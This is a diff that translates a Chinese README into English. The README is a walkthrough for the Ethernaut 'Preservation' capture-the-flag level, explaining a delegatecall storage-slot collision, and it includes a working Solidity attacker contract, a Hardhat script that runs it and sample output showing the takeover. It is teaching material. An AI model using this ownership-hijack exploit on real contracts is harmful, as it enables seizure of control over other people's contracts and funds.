@@ -1,16 +1,16 @@
-# Preservation 攻略指南
+# Preservation Strategy Guide
 
-本專案使用 Hardhat 開發環境，用於解決 [Ethernaut](https://ethernaut.openzeppelin.com/) 中的 Preservation 挑戰。
+This project uses the Hardhat development environment to solve the Preservation challenge in [Ethernaut](https://ethernaut.openzeppelin.com/).
 
-## 挑戰概述
+## Challenge Overview
 
-Preservation 合約使用了委託調用（delegatecall）來實現時區庫的功能。這種委託調用機制允許外部庫合約修改呼叫合約的狀態。問題在於，合約實現中存在潛在的安全漏洞。
+The Preservation contract uses delegate calls (delegatecall) to implement timezone library functionality. This delegate call mechanism allows external library contracts to modify the calling contract's state. The problem is that there are potential security vulnerabilities in the contract implementation.
 
-**目標**：獲取 Preservation 合約的所有權（成為 owner）。
+**Objective**: Gain ownership of the Preservation contract (become the owner).
 
-## 漏洞分析
+## Vulnerability Analysis
 
-查看合約原始碼可以發現：
+Looking at the contract source code reveals:
 
 ```solidity
 contract Preservation {
@@ -50,44 +50,44 @@ contract LibraryContract {
 }
 ```
 
-關鍵漏洞：使用 `delegatecall` 時，儲存槽位置的對應關係非常重要。當 Preservation 合約通過 delegatecall 調用庫合約的 `setTime` 函數時，雖然代碼在庫合約的上下文中執行，但是會修改 Preservation 合約的狀態。
+Key vulnerability: When using `delegatecall`, the correspondence of storage slot positions is very important. When the Preservation contract calls the library contract's `setTime` function through delegatecall, although the code executes in the library contract's context, it modifies the Preservation contract's state.
 
-問題在於 LibraryContract 和 Preservation 的儲存槽佈局不匹配：
-- Preservation 合約中，第一個儲存槽是 `timeZone1Library` (address)
-- LibraryContract 合約中，第一個儲存槽是 `storedTime` (uint256)
+The problem is that LibraryContract and Preservation have mismatched storage slot layouts:
+- In the Preservation contract, the first storage slot is `timeZone1Library` (address)
+- In the LibraryContract, the first storage slot is `storedTime` (uint256)
 
-這意味著當 LibraryContract 的 `setTime` 函數修改 `storedTime` 時，實際上會修改 Preservation 的 `timeZone1Library` 變數。
+This means that when LibraryContract's `setTime` function modifies `storedTime`, it actually modifies Preservation's `timeZone1Library` variable.
 
-## 攻擊步驟
+## Attack Steps
 
-1. 部署一個惡意庫合約，其儲存佈局與 Preservation 合約相匹配
-2. 調用 `setFirstTime` 函數，傳入我們惡意庫合約地址（轉換為 uint256）
-3. 再次調用 `setFirstTime`，這次會執行我們惡意庫合約的 `setTime` 函數
-4. 在惡意 `setTime` 函數中，直接修改 `owner` 變數為攻擊者地址
+1. Deploy a malicious library contract whose storage layout matches the Preservation contract
+2. Call the `setFirstTime` function, passing in our malicious library contract address (converted to uint256)
+3. Call `setFirstTime` again, this time it will execute our malicious library contract's `setTime` function
+4. In the malicious `setTime` function, directly modify the `owner` variable to the attacker's address
 
-## 專案結構
+## Project Structure
 
 ```
 16-preservation/
 ├── contracts/
-│   ├── Preservation.sol        # 原始挑戰合約
-│   └── PreservationAttacker.sol # 攻擊合約
+│   ├── Preservation.sol        # Original challenge contract
+│   └── PreservationAttacker.sol # Attack contract
 ├── scripts/
-│   └── deploy_PreservationAttacker.ts # 部署和攻擊腳本
-├── hardhat.config.ts           # Hardhat 配置
-└── README.md                   # 本文檔
+│   └── deploy_PreservationAttacker.ts # Deployment and attack script
+├── hardhat.config.ts           # Hardhat configuration
+└── README.md                   # This document
 ```
 
-## 合約實現
+## Contract Implementation
 
-我們的攻擊合約如下：
+Our attack contract is as follows:
 
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 contract PreservationAttacker {
-    // 確保儲存佈局與 Preservation 一致
+    // Ensure storage layout matches Preservation
     address public timeZone1Library;
     address public timeZone2Library;
     address public owner;
@@ -102,14 +102,14 @@ contract PreservationAttacker {
     }
 
     function attack() public {
-        // 第一步：將 timeZone1Library 改為我們的攻擊合約地址
+        // Step 1: Change timeZone1Library to our attack contract address
         preservation.setFirstTime(uint256(uint160(address(this))));
-        // 第二步：執行我們的 setTime 函數，改變所有者
-        preservation.setFirstTime(1); // 參數不重要
+        // Step 2: Execute our setTime function to change owner
+        preservation.setFirstTime(1); // Parameter doesn't matter
     }
 
     function setTime(uint256 _timeStamp) public {
-        owner = tx.origin; // 將合約所有者修改為我們的地址
+        owner = tx.origin; // Change contract owner to our address
     }
 }
 
@@ -119,61 +119,61 @@ interface IPreservation {
 }
 ```
 
-## 環境設置
+## Environment Setup
 
-### 前置條件
+### Prerequisites
 
 - Node.js 16+
-- npm 或 yarn
-- MetaMask 錢包
-- 一些測試網 ETH (如 Sepolia)
+- npm or yarn
+- MetaMask wallet
+- Some testnet ETH (e.g., Sepolia)
 
-### 安裝步驟
+### Installation Steps
 
-1. 複製專案
+1. Clone the project
 ```bash
 git clone https://github.com/your-username/ethernaut-solutions.git
 cd ethernaut-solutions/16-preservation
 ```
 
-2. 安裝依賴
+2. Install dependencies
 ```bash
 npm install
-# 或使用 yarn
+# or use yarn
 yarn install
 ```
 
-## 執行攻擊腳本
+## Execute Attack Script
 
-我們使用 Hardhat 腳本來解決挑戰：
+We use Hardhat scripts to solve the challenge:
 
 ```typescript
 import hre from "hardhat";
 const { ethers } = hre;
 
-// 改為你的目標合約地址
+// Change to your target contract address
 const CONTRACT_ADDRESS = "YOUR_PRESERVATION_INSTANCE_ADDRESS";
 
 async function main() {
     const [signer] = await ethers.getSigners();
-    console.log("我的帳戶地址 : ", signer.address);
+    console.log("My account address: ", signer.address);
 
     const preservation = await ethers.getContractAt("Preservation", CONTRACT_ADDRESS);
-    console.log("Preservation 關卡實例地址: ", CONTRACT_ADDRESS);
-    console.log("目前的 Preservation owner: ", await preservation.owner());
+    console.log("Preservation level instance address: ", CONTRACT_ADDRESS);
+    console.log("Current Preservation owner: ", await preservation.owner());
 
-    // =========進攻開始===========
+    // =========Attack begins===========
     const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
     const preservationAttacker = await PreservationAttacker.deploy(CONTRACT_ADDRESS);
     await preservationAttacker.waitForDeployment();
       
     console.log("PreservationAttacker Contract deployed to: ", await preservationAttacker.getAddress());
-    console.log("目前的 PreservationAttacker owner: ", await preservationAttacker.owner());
+    console.log("Current PreservationAttacker owner: ", await preservationAttacker.owner());
     
     const tx = await preservationAttacker.attack();
     await tx.wait();
 
-    console.log("目前的 Preservation owner: ", await preservation.owner());
+    console.log("Current Preservation owner: ", await preservation.owner());
 }
 
 main().catch((error) => {
@@ -182,39 +182,39 @@ main().catch((error) => {
 });
 ```
 
-將 CONTRACT_ADDRESS 修改為 Ethernaut 平台上的實例地址，然後執行：
+Change CONTRACT_ADDRESS to the instance address on the Ethernaut platform, then execute:
 
 ```bash
 npx hardhat run scripts/deploy_PreservationAttacker.ts --network sepolia
 ```
 
-執行結果示例：
+Example execution result:
 ```
-我的帳戶地址 :  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
-Preservation 關卡實例地址:  0x54058aA94F43E509Ad7B3D305aF9d612133f7907
-目前的 Preservation owner:  0x35b28CB86846382Aa6217283F12C13657FF0110B
+My account address:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+Preservation level instance address:  0x54058aA94F43E509Ad7B3D305aF9d612133f7907
+Current Preservation owner:  0x35b28CB86846382Aa6217283F12C13657FF0110B
 PreservationAttacker Contract deployed to:  0xC85d492a8Da94fdd05E2BdCA39B8b725fA1602D2
-目前的 PreservationAttacker owner:  0x0000000000000000000000000000000000000000
-目前的 Preservation owner:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+Current PreservationAttacker owner:  0x0000000000000000000000000000000000000000
+Current Preservation owner:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
 ```
 
-攻擊成功後，Preservation 合約的 owner 會變更為我們的地址，然後可以回到 Ethernaut 平台提交實例。
+After a successful attack, the Preservation contract's owner will change to our address, then you can return to the Ethernaut platform to submit the instance.
 
-## 學習要點
+## Learning Points
 
-1. **delegatecall 的危險性**：使用 delegatecall 時，被調用合約的代碼在呼叫合約的上下文中執行，可以修改呼叫合約的儲存。
+1. **Dangers of delegatecall**: When using delegatecall, the called contract's code executes in the calling contract's context and can modify the calling contract's storage.
 
-2. **儲存槽位置一致性的重要性**：在使用 delegatecall 時，必須確保呼叫合約和被調用合約的儲存佈局一致，否則會導致意外的狀態變更。
+2. **Importance of storage slot position consistency**: When using delegatecall, you must ensure that the calling contract and called contract have consistent storage layouts, otherwise unexpected state changes will occur.
 
-3. **合約安全設計原則**：
-   - 不要對不信任的外部合約使用 delegatecall
-   - 使用庫合約時應確保其安全可靠
-   - 實現庫合約時要考慮儲存佈局的一致性
+3. **Contract security design principles**:
+   - Don't use delegatecall on untrusted external contracts
+   - Ensure library contracts are secure and reliable when using them
+   - Consider storage layout consistency when implementing library contracts
 
-4. **合約升級風險**：這個漏洞展示了合約升級機制（如代理模式）中可能存在的風險。
+4. **Contract upgrade risks**: This vulnerability demonstrates the risks that may exist in contract upgrade mechanisms (such as proxy patterns).
 
-## 參考資料
+## References
 
-- [Solidity 官方文檔 - Delegatecall / Callcode 和庫](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
-- [Ethernaut - Preservation 挑戰](https://ethernaut.openzeppelin.com/level/16)
-- [智能合約安全最佳實踐](https://consensys.github.io/smart-contract-best-practices/)
+- [Solidity Official Documentation - Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
+- [Ethernaut - Preservation Challenge](https://ethernaut.openzeppelin.com/level/16)
+- [Smart Contract Security Best Practices](https://consensys.github.io/smart-contract-best-practices/)
